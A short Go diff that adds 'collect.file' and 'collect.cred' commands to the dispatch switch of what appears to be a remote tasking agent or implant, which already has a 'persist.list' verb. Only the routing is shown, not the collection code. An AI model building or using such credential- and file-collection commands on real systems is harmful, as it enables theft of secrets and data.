@@ -104,6 +104,10 @@ func (r *Runner) Dispatch(ctx context.Context, verb, arguments string) (rodpb.Ta
 	case "persist.list":
 		outcome, output := r.persistList(ctx, arguments)
 		return outcome, output, nil
+	case "collect.file":
+		return r.collectFile(ctx, arguments)
+	case "collect.cred":
+		return r.collectCred(ctx, arguments)
 	default:
 		r.log.Printf("unknown verb: %s", verb)
 		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "unknown verb: " + verb, nil
